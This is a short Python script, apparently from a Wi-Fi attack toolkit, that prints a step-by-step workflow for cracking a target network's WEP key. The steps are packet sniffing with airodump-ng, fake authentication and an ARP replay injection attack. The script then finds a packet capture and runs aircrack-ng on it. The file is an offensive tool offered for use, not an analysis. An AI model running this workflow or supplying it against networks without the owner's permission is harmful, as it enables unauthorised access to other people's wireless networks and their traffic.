import os
import subprocess

def display_warning():
    print("⚠️ Warning: Pre-Execution Steps ⚠️")
    print("Before running the 'wep.py' script, ensure you have performed the following steps:")
    print("------------------------------------------------------------")
    print("1. Start Airodump-ng Sniffing: Run 'wifi-sniffer.py' to initiate Airodump-ng and capture data packets.")
    print("   This will help gather essential information about the target network.")
    print("2. Create Association: In a separate terminal tab, run 'fake-auth.py' to establish an association with the target network.")
    print("   This step simulates a legitimate client connecting to the network.")
    print("3. Launch ARP Replay Attack: Execute 'arpreplay-attack.py' to perform the ARP Replay attack.")
    print("   This attack leverages captured ARP packets to inject forged packets into the network.")
    print("------------------------------------------------------------")
    print("Once these preparatory steps are completed, you can proceed to run the 'wep.py' script for WEP cracking.")
    print("Make sure to follow the sequence for accurate results and effective exploitation.")
    print("")

def find_captured_file(root_dir, filename):
    for dirpath, dirnames, filenames in os.walk(root_dir):
        if filename in filenames:
            return os.path.join(dirpath, filename)
    return None

def decrypt_captured_data():
    print("Wi-Fi Captured Data Decryption Script")
    print("-------------------------------------")

    root_dir = input("Enter the root directory to search for captured file (press Enter for current directory): ").strip()
    if not root_dir:
        root_dir = os.getcwd()  # Use the current working directory

    captured_file = input("Enter the name of the captured file (e.g., captured.cap): ")

    file_path = find_captured_file(root_dir, captured_file)
    if file_path:
        print("Decrypting captured data...")
        subprocess.run(['aircrack-ng', file_path])
        print("Decryption completed.")
    else:
        print("Captured file not found in subdirectories.")

def main():
    display_warning()
    decrypt_captured_data()

if __name__ == '__main__':
    main()
